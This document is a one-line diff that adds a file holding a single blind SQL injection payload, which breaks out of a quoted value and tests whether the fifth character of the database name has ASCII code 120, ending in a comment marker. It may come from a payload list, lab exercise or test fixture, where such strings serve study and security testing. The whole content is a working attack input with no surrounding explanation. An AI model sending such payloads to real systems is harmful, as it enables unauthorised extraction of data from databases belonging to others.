@@ -1,0 +1,1 @@
+1’ AND (select ascii(substr(database(),5,1))=120) --+
